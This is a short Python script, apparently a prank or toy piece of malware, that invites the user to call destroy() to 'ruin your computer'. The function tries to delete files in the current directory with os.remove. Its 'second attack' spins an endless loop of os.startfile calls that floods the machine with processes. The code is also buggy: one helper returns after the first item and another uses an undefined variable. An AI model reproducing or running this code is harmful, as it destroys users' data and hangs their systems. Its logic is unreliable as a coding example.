import os
import time
print("Type destroy() to try to.. ruin your computer.")
def counter():
 while cntr<=1:
    cntr=cntr+1
def convert(list1):
  str = ''
  for i in list1:
   str += i  
   return str  
def destroy():
   try:
    path=[os.path.abspath(x) for x in os.listdir('.')]
    x=(convert(path))
    os.remove(x)
    print("Successful.")
    time.sleep(999999)
   except:
      print("Unsuccessful.")
      n=input(("Want to try a second attack, enter Y to try second attack, press N to exit, press A to try the 1st attack again:"))
      if n==("Y"):
       while True:
         try:
          os.startfile("python.py")
         except:
          os.startfile("pythonw.py")
          try:
           os.startfile("python.py")
          except KeyboardInterrupt:
           os.startfile("pythonw.py")
      if n==("N"):
        exit()
      if n==("A"):
       destroy()
         
        
      
   
 
   
   
   
